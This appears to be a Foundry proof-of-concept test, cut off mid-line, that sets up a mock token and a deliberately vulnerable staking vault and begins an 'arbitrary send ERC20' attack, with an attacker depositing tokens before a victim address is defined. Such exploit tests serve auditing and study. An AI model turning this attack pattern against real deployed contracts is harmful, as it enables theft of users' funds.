pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "../src/test.sol";

contract PoC is Test {
    MockToken public token;
    VulnerableStakingVault public vault;
    address public attacker = address(0x1234567890123456789012345678901234567890);

    function setUp() public {
        token = new MockToken(1000000 ether);
        vault = new VulnerableStakingVault(address(token));
        token.transfer(attacker, 1000 ether);
    }

    function testArbitrarySendERC20() public {
        vm.prank(attacker);
        token.approve(address(vault), 1000 ether);
        vm.prank(attacker);
        vault.deposit(1000 ether);

        address victim = address(0x1111111111111111111111111111111